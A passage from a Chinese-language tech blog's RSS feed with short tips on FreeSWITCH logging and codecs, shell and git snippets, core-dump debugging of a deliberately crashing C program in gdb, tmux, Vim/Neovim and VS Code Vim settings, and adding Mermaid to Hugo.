&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;将fs_cli的输出写到日志文件里&#34;&gt;将fs_cli的输出，写到日志文件里&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sofia tracelevel 会将某些日志重定向到日志文件里

sofia tracelevel debug

# sofia tracelevel &amp;lt;console|alert|crit|err|warning|notice|info|debug&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意，debug级别的日志非常多，仅仅适用于debug&lt;/p&gt;
&lt;p&gt;大量的日志写入磁盘&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;占用太多的io&lt;/li&gt;
&lt;li&gt;磁盘空间可能很快占满&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>Sofia 模块全部配置</title>
      <link>https://wdd.js.org/freeswitch/sofia-config/</link>
      <pubDate>Sat, 28 May 2022 14:57:59 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/sofia-config/</guid>
      <description>&lt;h1 id=&#34;about&#34;&gt;About&lt;/h1&gt;
&lt;p&gt;Sofia is a  FreeSWITCH™ module (&lt;a href=&#34;https://freeswitch.org/confluence/display/FREESWITCH/mod_sofia&#34;&gt;mod_sofia&lt;/a&gt;) that provides SIP connectivity to and from FreeSWITCH in the form of a User Agent.
A &amp;ldquo;User Agent&amp;rdquo; (&amp;ldquo;UA&amp;rdquo;) is an application used for handling a certain network protocol; the network protocol in Sofia&amp;rsquo;s case is SIP. Sofia is the general name of any User Agent in FreeSWITCH using the SIP network protocol.
For example, Sofia receives calls sent to FreeSWITCH from other SIP User Agents (UAs), sends calls to other UAs, acts as a client to register FreeSWITCH with other UAs, lets clients register with FreeSWITCH, and connects calls (i.e., to local extensions).
To add a SIP Provider (Sofia User Agent) to your FreeSWITCH, please see the &lt;a href=&#34;https://freeswitch.org/confluence/display/FREESWITCH/Interoperability&#34;&gt;Interoperability Examples&lt;/a&gt; and add the SIP Provider information in an .xml file stored under conf/sip_profiles/&lt;/p&gt;</description>
    </item>
    <item>
      <title>FS常用运维手册</title>
      <link>https://wdd.js.org/freeswitch/tips/</link>
      <pubDate>Sat, 28 May 2022 14:54:40 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/tips/</guid>
      <description>&lt;h1 id=&#34;安装单个模块&#34;&gt;安装单个模块&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;make mod_sofia-install
make mod_ilbc-install
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;fs-cli事件订阅&#34;&gt;fs-cli事件订阅&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/event plain ALL
/event plain CHANNEL_ANSWER
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;sofia-帮助文档&#34;&gt;sofia 帮助文档&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sofia help


USAGE:
--------------------------------------------------------------------------------
sofia global siptrace &amp;lt;on|off&amp;gt;
sofia        capture  &amp;lt;on|off&amp;gt;
             watchdog &amp;lt;on|off&amp;gt;

sofia profile &amp;lt;name&amp;gt; [start | stop | restart | rescan] [wait]
                     flush_inbound_reg [&amp;lt;call_id&amp;gt; | &amp;lt;[user]@domain&amp;gt;] [reboot]
                     check_sync [&amp;lt;call_id&amp;gt; | &amp;lt;[user]@domain&amp;gt;]
                     [register | unregister] [&amp;lt;gateway name&amp;gt; | all]
                     killgw &amp;lt;gateway name&amp;gt;
                     [stun-auto-disable | stun-enabled] [true | false]]
                     siptrace &amp;lt;on|off&amp;gt;
                     capture  &amp;lt;on|off&amp;gt;
                     watchdog &amp;lt;on|off&amp;gt;

sofia &amp;lt;status|xmlstatus&amp;gt; profile &amp;lt;name&amp;gt; [reg [&amp;lt;contact str&amp;gt;]] | [pres &amp;lt;pres str&amp;gt;] | [user &amp;lt;user@domain&amp;gt;]
sofia &amp;lt;status|xmlstatus&amp;gt; gateway &amp;lt;name&amp;gt;

sofia loglevel &amp;lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun&amp;gt; [0-9]
sofia tracelevel &amp;lt;console|alert|crit|err|warning|notice|info|debug&amp;gt;

sofia help
--------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;开启消息头压缩&#34;&gt;开启消息头压缩&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;param name=&amp;#34;enable-compact-headers&amp;#34; value=&amp;#34;true&amp;#34;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;fs需要重启&lt;/p&gt;</description>
    </item>
    <item>
      <title>FreeSWITCH 媒体相关操作</title>
      <link>https://wdd.js.org/freeswitch/media-settings/</link>
      <pubDate>Sat, 28 May 2022 14:50:55 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/media-settings/</guid>
      <description>&lt;h1 id=&#34;查看fs支持的编码&#34;&gt;查看FS支持的编码&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;show codec
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;编码设置&#34;&gt;编码设置&lt;/h1&gt;
&lt;p&gt;vars.xml&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;global_codec_prefs=G722,PCMU,PCMA,GSM
outbound_codec_prefs=PCMU,PCMA,GSM
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;查看fs使用的编码&#34;&gt;查看FS使用的编码&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; sofia status profile internal
CODECS IN         ILBC,PCMU,PCMA,GSM
CODECS OUT        ILBC,PCMU,PCMA,GSM

&amp;gt; sofia status profile external
CODECS IN         ILBC,PCMU,PCMA,GSM
CODECS OUT        ILBC,PCMU,PCMA,GSM
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;使修改后的profile生效&#34;&gt;使修改后的profile生效&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; sofia profile internal rescan
&amp;gt; sofia profile external rescan
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;重启profile&#34;&gt;重启profile&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; sofia profile internal restart
&amp;gt; sofia profile external restart
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Shell 教程技巧</title>
      <link>https://wdd.js.org/posts/2022/05/shell-101/</link>
      <pubDate>Sat, 28 May 2022 12:39:50 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/05/shell-101/</guid>
      <description>&lt;h1 id=&#34;复制文本到剪贴板&#34;&gt;复制文本到剪贴板&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install xclip
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;vim ~/.zshrc&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;alias copy=&amp;#39;xclip -selection clipboard&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样我们就可以用copy命令来考本文件内容到系统剪贴板了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;copy aaa.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;判断工作区是否clean&#34;&gt;判断工作区是否clean&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;git status --porcelain&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Working directory clean&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Uncommitted changes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>C和gdb调试</title>
      <link>https://wdd.js.org/posts/2022/05/c-and-gdb/</link>
      <pubDate>Sat, 28 May 2022 12:35:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/05/c-and-gdb/</guid>
      <description>&lt;h1 id=&#34;开启coredump&#34;&gt;开启coredump&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#如果该命令的返回值是0，则表示不开启coredump
ulimit -c

# 开启coredump
ulimit -c unlimited
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;准备c文件&#34;&gt;准备c文件&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;


void crash() {
    char * p = NULL;
    *p = 0;
}

int main(){
    printf(&amp;#34;hello world 1&amp;#34;);
    int phone [4];
    phone[232] = 12;
    crash();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;编译执行&#34;&gt;编译执行&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gcc -g  hello.c -o hello
./hello
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后程序崩溃，产生core文件。&lt;/p&gt;
&lt;h1 id=&#34;gdb分析&#34;&gt;gdb分析&lt;/h1&gt;
&lt;p&gt;gdb 启动的二进制文件 core文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdb ./hello ./core
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后输入： bt full 可以查看到更详细的信息&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  c-sandbox gdb ./hello ./core
GNU gdb (Raspbian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &amp;#34;show copying&amp;#34;
and &amp;#34;show warranty&amp;#34; for details.
This GDB was configured as &amp;#34;arm-linux-gnueabihf&amp;#34;.
Type &amp;#34;show configuration&amp;#34; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &amp;#34;help&amp;#34;.
Type &amp;#34;apropos word&amp;#34; to search for commands related to &amp;#34;word&amp;#34;...
Reading symbols from ./hello...done.
[New LWP 25571]
Core was generated by `./hello&amp;#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0001045c in crash () at hello.c:6
6           *p = 0;
(gdb) bt full
#0  0x0001045c in crash () at hello.c:6
        p = 0x0
#1  0x00010490 in main () at hello.c:13
        phone = {66328, 0, 0, 0}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Tmux 常见问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/05/tmux-faq/</link>
      <pubDate>Sat, 28 May 2022 12:30:58 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/05/tmux-faq/</guid>
      <description>&lt;h1 id=&#34;oh-my-tmux-关闭第二键ctrl-a&#34;&gt;oh my tmux 关闭第二键ctrl-a&lt;/h1&gt;
&lt;p&gt;ctrl-a可以用来移动光标到行首的，不要作为tmux的第二键&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set -gu prefix2
unbind C-a
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;tmux-reload-config&#34;&gt;Tmux reload config&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:source-file ～/.tmux.conf
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;tmux-显示时间&#34;&gt;tmux 显示时间&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ctrl b + t
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;tmux从当前目录打开新的窗口&#34;&gt;tmux从当前目录打开新的窗口&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bind &amp;#39;&amp;#34;&amp;#39; split-window -c &amp;#34;#{pane_current_path}&amp;#34;
bind % split-window -h -c &amp;#34;#{pane_current_path}&amp;#34;
bind c new-window -c &amp;#34;#{pane_current_path}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Vim 常见问题以及解决方案</title>
      <link>https://wdd.js.org/vim/vim-faq/</link>
      <pubDate>Sat, 28 May 2022 12:21:47 +0800</pubDate>
      <guid>https://wdd.js.org/vim/vim-faq/</guid>
      <description>&lt;h1 id=&#34;修改coc-vim的错误提示&#34;&gt;修改coc-vim的错误提示&lt;/h1&gt;
&lt;p&gt;coc-vim的错误提示窗口背景色是粉红，前景色是深红。这样的掩饰搭配，很难看到具体的文字颜色。&lt;/p&gt;
&lt;p&gt;所以我们需要把前景色改成白色。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:highlight CocErrorFloat ctermfg=White
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考 &lt;a href=&#34;https://stackoverflow.com/questions/64180454/how-to-change-coc-nvim-floating-window-colors&#34;&gt;https://stackoverflow.com/questions/64180454/how-to-change-coc-nvim-floating-window-colors&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;vim-go一直卡在初始化&#34;&gt;vim go一直卡在初始化&lt;/h1&gt;
&lt;p&gt;有可能没有安装二进制工具&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:GoInstallBinaries
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;neovim-光标变成细线解决方案&#34;&gt;neovim 光标变成细线解决方案&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:set guicursor=
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>vscode vim插件自定义快捷键</title>
      <link>https://wdd.js.org/vim/vscode-vim/</link>
      <pubDate>Sat, 28 May 2022 11:20:30 +0800</pubDate>
      <guid>https://wdd.js.org/vim/vscode-vim/</guid>
      <description>&lt;p&gt;我承认，vscode很香，但是vim的开发方式也让我无法割舍。&lt;/p&gt;
&lt;p&gt;vscode中有个vim插件，基本上可以满足大部分vim的功能。&lt;/p&gt;
&lt;p&gt;这里我定义了我在vim常用的leader快捷键。&lt;/p&gt;
&lt;h1 id=&#34;设置为默认的leader&#34;&gt;设置,为默认的leader&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;vim.leader&amp;#34;: &amp;#34;,&amp;#34;,
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;在normal模式能comandc复制&#34;&gt;在Normal模式能comand+c复制&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    &amp;#34;vim.handleKeys&amp;#34;: {
        &amp;#34;&amp;lt;C-c&amp;gt;&amp;#34;: false,
        &amp;#34;&amp;lt;C-v&amp;gt;&amp;#34;: false
    },
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;leader快捷键&#34;&gt;leader快捷键&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在插入模式安jj会跳出插入模式&lt;/li&gt;
&lt;li&gt;,a:  跳到行尾部，并进入插入模式&lt;/li&gt;
&lt;li&gt;,c: 关闭当前标签页&lt;/li&gt;
&lt;li&gt;,C: 关闭其他标签页&lt;/li&gt;
&lt;li&gt;,j: 跳转到左边标签页&lt;/li&gt;
&lt;li&gt;,k: 跳转到右边标签页&lt;/li&gt;
&lt;li&gt;,w: 保存文件&lt;/li&gt;
&lt;li&gt;,t: 给出提示框&lt;/li&gt;
&lt;li&gt;,b: 显示或者隐藏文件树窗口&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;完整的配置&#34;&gt;完整的配置&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    &amp;#34;vim.leader&amp;#34;: &amp;#34;,&amp;#34;,
    &amp;#34;vim.insertModeKeyBindings&amp;#34;: [
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;j&amp;#34;, &amp;#34;j&amp;#34; ],
            &amp;#34;after&amp;#34;: [ &amp;#34;&amp;lt;Esc&amp;gt;&amp;#34; ]
        }
    ],
    &amp;#34;vim.handleKeys&amp;#34;: {
        &amp;#34;&amp;lt;C-c&amp;gt;&amp;#34;: false,
        &amp;#34;&amp;lt;C-v&amp;gt;&amp;#34;: false
    },
    &amp;#34;vim.normalModeKeyBindingsNonRecursive&amp;#34;: [
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;a&amp;#34; ],
            &amp;#34;after&amp;#34;: [ &amp;#34;A&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;c&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.closeActiveEditor&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;C&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.closeOtherEditors&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;j&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.previousEditor&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;k&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.nextEditor&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;w&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.files.save&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;t&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;editor.action.showHover&amp;#34; ]
        },
        {
            &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;b&amp;#34; ],
            &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.action.toggleSidebarVisibility&amp;#34; ]
        },
    ]
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>和系统剪贴板进行交互</title>
      <link>https://wdd.js.org/vim/clipboard/</link>
      <pubDate>Sat, 28 May 2022 10:59:03 +0800</pubDate>
      <guid>https://wdd.js.org/vim/clipboard/</guid>
      <description>&lt;h1 id=&#34;neovim如何与系统剪贴板交互&#34;&gt;neovim如何与系统剪贴板交互？&lt;/h1&gt;
&lt;p&gt;neovim和系统剪贴板的交互方式和vim的机制是不同的，所以不要先入为主的用vim的方式使用neovim。&lt;/p&gt;
&lt;p&gt;neovim需要外部的程序与系统剪贴板进行交互，参考:help clipboard&lt;/p&gt;
&lt;p&gt;neovim按照如下的优先级级方式选择交互程序：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  - |g:clipboard|
  - pbcopy, pbpaste (macOS)
  - wl-copy, wl-paste (if $WAYLAND_DISPLAY is set)
  - xclip (if $DISPLAY is set)
  - xsel (if $DISPLAY is set)
  - lemonade (for SSH) https://github.com/pocke/lemonade
  - doitclient (for SSH) http://www.chiark.greenend.org.uk/~sgtatham/doit/
  - win32yank (Windows)
  - termux (via termux-clipboard-set, termux-clipboard-set)
  - tmux (if $TMUX is set)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为我的操作系统是linux, 所以方便的方式是直接安装xclip。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo pacman -Syu xclip
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;两个系统剪贴板有何不同&#34;&gt;两个系统剪贴板有何不同？&lt;/h1&gt;
&lt;p&gt;对于windows和mac来说，只有有一个系统剪贴板，对于linux有两个。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;剪贴板，鼠标选择剪贴板&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;剪贴板，选择之后复制剪贴板&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如下图，我用鼠标选择了12345, 但是没有按ctrl + c,  这时候你打开nvim， 执行:reg, 可以看到注册器&lt;/p&gt;</description>
    </item>
    <item>
      <title>搜索工作目录下的文件并替换</title>
      <link>https://wdd.js.org/vim/search-dir-replace/</link>
      <pubDate>Sat, 28 May 2022 10:35:58 +0800</pubDate>
      <guid>https://wdd.js.org/vim/search-dir-replace/</guid>
      <description>&lt;p&gt;在vscode中，可以选中一个目录，然后在目录中搜索对应的关键词，再查找到对应文件中，然后做替换。&lt;/p&gt;
&lt;p&gt;在vim也可以这样做。&lt;/p&gt;
&lt;p&gt;但是这件事要分成两步。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;根据关键词，查找文件&lt;/li&gt;
&lt;li&gt;对多个文件进行替换&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;搜索关键词&#34;&gt;搜索关键词&lt;/h1&gt;
&lt;p&gt;搜索关键词可以用grep, 或者vim自带的vimgrep。&lt;/p&gt;
&lt;p&gt;但是我更喜欢用ripgrep，因为速度很快。&lt;/p&gt;
&lt;p&gt;ripgrep也有对应的vim插件 &lt;a href=&#34;https://github.com/jremmen/vim-ripgrep&#34;&gt;https://github.com/jremmen/vim-ripgrep&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;例如要搜索关键词 key1, 那么符合关键词的文件将会被放到quickfix列表中。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:Rg key1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以用 &lt;code&gt;:copen&lt;/code&gt; 来打开quickfix列表。&lt;/p&gt;
&lt;h1 id=&#34;替换-cdo&#34;&gt;替换 cdo&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:cdo %s/key1/key2/gc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;c表示在替换的时候，需要手工确认每一项。&lt;/p&gt;
&lt;p&gt;在替换的时候，可以输入&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;y (yes)执行替换&lt;/li&gt;
&lt;li&gt;n (no)忽略此处替换&lt;/li&gt;
&lt;li&gt;a (all)替换此处和之后的所有项目&lt;/li&gt;
&lt;li&gt;q (quit) 退出替换过程&lt;/li&gt;
&lt;li&gt;l (last) 替换此处后退出&lt;/li&gt;
&lt;li&gt;^E 向上滚动屏幕&lt;/li&gt;
&lt;li&gt;^Y 向下滚动屏幕&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>1001个Vim高级技巧 - 0-55</title>
      <link>https://wdd.js.org/vim/vim-tips/</link>
      <pubDate>Fri, 27 May 2022 19:25:48 +0800</pubDate>
      <guid>https://wdd.js.org/vim/vim-tips/</guid>
      <description>&lt;div class=&#34;notice info&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-exclamation-circle&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;C表示按住Ctrl, C-o表示同时按住Ctrl和o&lt;/div&gt;
&lt;/div&gt;
&lt;h1 id=&#34;1-在tmux中-vim-airline插件颜色显示不正常&#34;&gt;1. 在tmux中 vim-airline插件颜色显示不正常&lt;/h1&gt;
&lt;p&gt;解决方案：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;screen-256color
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-buffer相关操作&#34;&gt;2. buffer相关操作&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:ls # 显示所有打开的buffer
:b {bufferName} #支持tab键自动补全
:bd # 关闭当前buffer
:bn # 切换到下一个buffer
:bp # 切换到上一个buffer
:b# # 切换到上一个访问过的buffer
:b1 # 切换到buffer1
:bm # 切换到最近修改过的buffer
:sb {bufferName} # 上下分屏
:vert sb {bufferName} # 左右分屏
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-跳转到对应的符号上&#34;&gt;3. 跳转到对应的符号上&lt;/h1&gt;
&lt;p&gt;下面这种符号，一般都是成双成对的，只要在其中一个上按%, 就会自动跳转到对应的符号&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;() [] {}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-关闭netrw的banner&#34;&gt;4. 关闭netrw的banner&lt;/h1&gt;
&lt;p&gt;如果熟练的是用了netrw，就可以把默认开启的banner给关闭掉。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;let g:netrw_banner = 0
let g:netrw_liststyle = 3
let g:netrw_winsize = 25
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-如何同时保存所有发生变化的文件&#34;&gt;5. 如何同时保存所有发生变化的文件？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;把所有发生变化的文件给保存 &lt;code&gt;:wa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;把所有发生变化的文件都保存，然后退出vim  &lt;code&gt;:xa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;退出vim, 所有发生变化的文件都不保存，&lt;code&gt;:qa!&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-插入当前时间&#34;&gt;6. 插入当前时间&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;:r!date
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;7-光标下的文件跳转&#34;&gt;7. 光标下的文件跳转&lt;/h1&gt;
&lt;p&gt;按&lt;code&gt;gf&lt;/code&gt;可以跳转光标下的文件&lt;/p&gt;</description>
    </item>
    <item>
      <title>hugo博客增加mermaid 绘图插件</title>
      <link>https://wdd.js.org/posts/2022/05/02-hugo-add-mermaid/</link>
      <pubDate>Fri, 27 May 2022 11:49:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/05/02-hugo-add-mermaid/</guid>
      <description>&lt;h1 id=&#34;step1&#34;&gt;step1&lt;/h1&gt;
&lt;p&gt;在layouts/baseof.html 的最后追加如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{ if .Store.Get &amp;#34;hasMermaid&amp;#34; }}
